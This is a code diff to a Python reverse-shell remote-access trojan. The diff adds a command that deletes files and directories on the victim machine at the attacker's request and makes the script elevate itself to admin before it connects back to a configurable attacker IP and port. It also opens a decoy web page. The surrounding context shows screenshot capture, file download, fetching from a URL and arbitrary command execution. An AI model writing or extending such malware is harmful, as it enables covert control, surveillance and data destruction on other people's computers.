@@ -6,6 +6,7 @@ import subprocess
 import os
 import base64
 import urllib.request
+import shutil
 from PIL import ImageGrab
 
 BUFFER_SIZE = 4096
@@ -68,6 +69,19 @@ def take_screenshot():
     screenshot.save(screenshot_path)
     return screenshot_path
 
+def delete_file_or_dir(path):
+    try:
+        if os.path.isfile(path):
+            os.remove(path)
+            return True, f"File {path} deleted successfully"
+        elif os.path.isdir(path):
+            shutil.rmtree(path)
+            return True, f"Directory {path} deleted successfully"
+        else:
+            return False, f"Path {path} not found"
+    except Exception as e:
+        return False, f"Delete error: {str(e)}"
+
 def reverse_shell(ip, port):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -114,6 +128,13 @@ def reverse_shell(ip, port):
                 download_file(s, screenshot_path)
                 continue
 
+            # Handle delete command
+            if command.startswith("delete "):
+                path = command[7:]
+                success, message = delete_file_or_dir(path)
+                s.send(message.encode())
+                continue
+
             # Handle executing programs (.py and .exes for now)
             if command.startswith("run "):
                 file_path = command[4:]
@@ -130,8 +151,7 @@ def reverse_shell(ip, port):
                 continue
 
             if command.startswith("help"):
-                s.send(b"Command list:\ndownload\nuploadfromurl\nscreenshot\nrun\ncd, and other cmd commands\n")
-
+                s.send(b"Command list:\ndownload\nuploadfromurl\nscreenshot\ndelete\nrun\ncd, and other cmd commands\n")
 
             # Execute system command
             try:
@@ -151,12 +171,16 @@ def reverse_shell(ip, port):
         print(f"Connection error: {e}")
 
 if __name__ == "__main__":
-    print("Running with admin privileges")
+    if is_admin():
+        print("Running with admin privileges")
 
-    webbrowser.open("example.com")
+        webbrowser.open("example.com")
 
-    # Configure these values to the attackers stuff
-    attacker_ip = "0.0.0.0"
-    attacker_port = 4444
+        # Configure these values to the attackers stuff
+        attacker_ip = "0.0.0.0"
+        attacker_port = 4444
 
-    reverse_shell(attacker_ip, attacker_port)
+        reverse_shell(attacker_ip, attacker_port)
+    else:
+        print("Requesting admin privileges...")
+        run_as_admin()
